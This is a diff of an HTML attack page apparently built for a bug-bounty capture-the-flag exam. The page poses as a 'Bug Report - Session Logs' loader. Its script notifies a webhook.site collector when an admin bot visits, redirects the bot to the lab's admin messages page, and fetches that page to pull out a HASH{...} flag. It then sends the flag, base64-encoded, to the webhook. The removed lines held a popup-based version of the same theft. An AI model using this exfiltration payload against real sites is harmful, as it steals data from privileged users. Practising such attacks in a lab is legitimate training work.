@@ -1,34 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Exam Analytics</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Report - Session Logs</title>
 </head>
 <body>
-    <h1>Processing...</h1>
+    <div style="font-family: sans-serif; padding: 20px;">
+        <h1>Loading Secure Session Logs...</h1>
+        <p>Please wait while the system synchronizes with the admin dashboard.</p>
+    </div>
+
     <script>
         const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";
-        
-        // 1. Log that the bot arrived
-        fetch(webhook + "?status=Bot_on_GitHub");
+        const messageId = "69e7fadabee6d6b7c6643374";
+        const labDashboard = "https://bugbounty-exam.hashacademy.co/admin/messages/" + messageId;
 
-        // 2. The Payload: Navigate to the lab and run code
-        // We use a delay to ensure the lab session is active
-        setTimeout(() => {
-            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
-        }, 500);
+        // 1. Immediate Notification
+        fetch(webhook + "?event=bot_entered_github_bridge");
 
-        // 3. If the bot stays on this page, we try to grab cookies via a popup (Backup)
-        const win = window.open("https://bugbounty-exam.hashacademy.co/admin/dashboard");
+        // 2. The Force-Redirect
+        // We use a slight delay to ensure the browser registers the origin change
         setTimeout(() => {
-            try {
-                const flag = win.document.body.innerText.match(/HASH\{[^}]+\}/);
-                if (flag) {
-                    fetch(webhook + "?FLAG=" + btoa(flag[0]));
+            window.location.href = labDashboard;
+        }, 1000);
+
+        // 3. Fallback: If redirect is blocked, try a direct fetch to exfiltrate
+        // (Note: This may fail due to CORS, but it's a good secondary attempt)
+        fetch(labDashboard)
+            .then(r => r.text())
+            .then(html => {
+                if(html.includes("HASH{")) {
+                    fetch(webhook + "?FLAG_FROM_FETCH=" + btoa(html.match(/HASH\{[^}]+\}/)[0]));
                 }
-            } catch(e) {
-                fetch(webhook + "?error=CORS_Blocked_Trying_Redirect");
-            }
-        }, 3000);
+            });
     </script>
 </body>
 </html>
